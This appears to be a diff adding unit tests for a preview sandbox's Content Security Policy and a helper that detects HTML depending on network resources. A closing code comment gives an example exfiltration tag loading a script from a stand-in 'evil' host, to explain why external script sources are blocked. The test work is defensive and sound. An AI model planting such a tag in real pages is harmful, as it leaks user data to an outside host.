@@ -1,7 +1,9 @@
 import {
   PDF_PREVIEW_CSP,
   PREVIEW_CSP,
+  PREVIEW_CSP_INLINE,
   escapeForInlineJsTemplate,
+  htmlDependsOnNetwork,
   injectPreviewCsp,
   stripScripts,
 } from "@/lib/previewSandbox";
@@ -17,6 +19,29 @@ describe("PREVIEW_CSP", () => {
     expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
   });
 
+  it("PREVIEW_CSP_INLINE keeps egress locks without meta sandbox", () => {
+    expect(PREVIEW_CSP_INLINE).toContain("connect-src 'none'");
+    expect(PREVIEW_CSP_INLINE).not.toContain("sandbox");
+    expect(PREVIEW_CSP.startsWith(PREVIEW_CSP_INLINE)).toBe(true);
+  });
+});
+
+describe("htmlDependsOnNetwork", () => {
+  it("detects http(s) script/link/img and css urls", () => {
+    expect(htmlDependsOnNetwork('<script src="https://cdn.example/x.js">')).toBe(
+      true,
+    );
+    expect(htmlDependsOnNetwork('<link href="http://x/y.css" rel="stylesheet">')).toBe(
+      true,
+    );
+    expect(htmlDependsOnNetwork("body{background:url(https://x/a.png)}")).toBe(true);
+    expect(
+      htmlDependsOnNetwork("<style>h1{color:red}</style><h1>hi</h1>"),
+    ).toBe(false);
+  });
+});
+
+describe("PREVIEW_CSP egress details", () => {
   it("blocks https on script/style (external script-src exfiltration)", () => {
     // connect-src 'none' alone is not enough: <script src="https://evil/?…">
     // still fires a GET. Inline-only preview — no CDN hosts.
